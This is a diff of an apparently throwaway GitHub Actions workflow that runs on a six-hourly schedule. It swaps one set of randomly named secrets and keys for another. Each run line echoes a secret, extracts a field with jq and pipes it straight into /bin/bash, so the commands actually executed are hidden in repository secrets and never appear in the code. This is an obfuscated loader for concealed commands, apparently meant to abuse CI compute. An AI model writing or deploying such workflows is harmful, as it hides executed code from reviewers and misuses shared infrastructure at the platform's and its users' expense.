@@ -1,10 +1,11 @@
 name: dongzhaliang9876
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
+    - cron: '8 3/6 * * *'
 
-jobs:  # 19361
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,20 +13,14 @@ jobs:  # 19361
       - uses: actions/checkout@v4
       - name: dongzhaliang9876
         env:
-          j0: ${{ secrets.j0 }}
+          yk1092: ${{ secrets.yk1092 }}
         run: |
-          echo $j0 | jq -r .yltx39 | /bin/bash
-          echo $rgpvh756 | jq -r .qzt2 | /bin/bash
-          echo $g557 | jq -r .ux93213 | /bin/bash
-          echo $ty08956 | jq -r .og470 | /bin/bash
-          echo $esk7 | jq -r .pvof6 | /bin/bash
-          echo $qfixg2 | jq -r .bdt9 | /bin/bash
-          echo $samy70106 | jq -r .pmh161 | /bin/bash
-          echo $tglfq843 | jq -r .f01005 | /bin/bash
-          echo $xnybj4 | jq -r .bn694 | /bin/bash
-          echo $mj9597 | jq -r .upc6 | /bin/bash
-          echo $in58968 | jq -r .flybg5167 | /bin/bash
-          echo $rvp12 | jq -r .r875 | /bin/bash
-          echo $hjl816 | jq -r .cfcc82 | /bin/bash
-          echo $zjlc7682 | jq -r .uezmy82872 | /bin/bash
+          echo $yk1092 | jq -r .ln62 | /bin/bash
+          echo $yi58 | jq -r .q1 | /bin/bash
+          echo $kp08 | jq -r .q1300 | /bin/bash
+          echo $wpyo22 | jq -r .k180 | /bin/bash
+          echo $wm46232 | jq -r .lrtio7 | /bin/bash
+          echo $isbwc69462 | jq -r .bvg0 | /bin/bash
+          echo $cnor737 | jq -r .cmdb9 | /bin/bash
+          echo $ikq24 | jq -r .q8243 | /bin/bash
 
